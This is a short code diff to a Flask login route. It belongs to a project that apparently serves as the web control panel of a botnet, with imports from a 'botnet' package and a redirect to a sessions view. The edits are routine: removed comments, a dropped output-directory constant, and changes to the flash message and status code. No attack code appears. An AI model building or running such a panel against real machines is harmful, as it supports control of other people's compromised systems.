@@ -8,18 +8,11 @@ from flask_login import login_user, logout_user, current_user, login_required
 from botnet.dao import user_dao
 from web_gui.routes.user.forms import LoginForm
 
-
-# Blueprint
 users = Blueprint('users', __name__)
-
-# Globals
-OUTPUT_DIR = os.path.abspath('botnet/output')
-	
 
 @users.route("/login", methods=['GET', 'POST'])
 def login():
 	"""Log user in"""
-	session.pop('_flashes', None)
 	if current_user.is_authenticated:
 		return redirect(url_for('root.sessions'))
 
@@ -30,8 +23,8 @@ def login():
 			login_user(user)
 			next_page = request.args.get('next')
 			return redirect(next_page or url_for('root.sessions'))
-		flash("Invalid username/password.", 'danger')
-	return render_template("login.html", form=form, title="Log In"), 403
+		flash("Invalid username/password.")
+	return render_template("login.html", form=form, title="Log In")
 
 
 @users.route('/logout')
